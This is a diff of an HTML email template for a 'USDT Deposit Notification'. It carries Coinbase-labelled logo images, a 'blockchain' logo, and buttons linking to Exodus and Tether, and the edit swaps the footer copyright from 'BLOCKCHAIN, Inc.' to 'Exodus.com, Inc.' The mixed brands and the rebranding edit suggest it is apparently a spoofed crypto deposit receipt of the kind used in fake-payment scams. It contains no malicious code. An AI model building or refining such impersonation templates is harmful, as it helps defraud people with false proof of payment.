@@ -1,11 +1,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <h2>Deposit Notification</h2>
+  <h2>USDT Deposit Notification</h2>
 </head>
 <body>
-<div class="container">
- <img src="IMG_0523.jpeg" alt="Coinbase" width="150" />
+<img src="IMG_0560.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
 
 <h2 style="color:#333333; margin:0 0 10px 0; font-size:24px;">Deposit Received</h2>
     <p style="font-size:16px; color:#555555; margin:0;">You've received a deposit of</p>
@@ -114,19 +113,16 @@
  <div style="text-align: center;">
   <img src="IMG_0561.png" alt="blockchain Logo" width="320" style="display: inline-block;"/>
 </div>
+           <!-- Buttons -->
+  <a href="https://www.exodus.com" style="font-size:16px; font-weight:bold; background-color:#0052ff; color:#ffffff; text-decoration:none; padding:12px 24px; border-radius:5px; display:inline-block; margin:10px 5px;" class="button" target="_blank">Login to Wallet</a>
 
-    <!-- Buttons -->
-              
- <a href="https://www.exodus.com" style="font-size:16px; font-weight:bold; background-color:#0052ff; color:#ffffff; text-decoration:none; padding:12px 24px; border-radius:5px; display:inline-block; margin:10px 5px;" class="button" target="_blank">Login to WALLET</a>
-
- <a href="https://tether.to/en/" style="font-size:16px; font-weight:bold; background-color:#00c292; color:#ffffff; text-decoration:none; padding:12px 24px; border-radius:5px; display:inline-block; margin:10px 5px;" class="button" target="_blank">View Transaction</a>
+<a href="https://tether.to/en/" style="font-size:16px; font-weight:bold; background-color:#00c292; color:#ffffff; text-decoration:none; padding:12px 24px; border-radius:5px; display:inline-block; margin:10px 5px;" class="button" target="_blank">View Transaction</a>
            
           <!-- Footer -->
    <tr>
            <td align="center" style="padding: 30px 20px; font-size:12px; color: green;">
- ©️ 2025 BLOCKCHAIN, Inc. All rights reserved.<br/>
-              ®️ PRIVACY POLICY
+ © 2025 Exodus.com, Inc. All rights reserved.<br/>
+              ® PRIVACY POLICY
 
-<br> 
-
+             
   <img src="IMG_0560.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
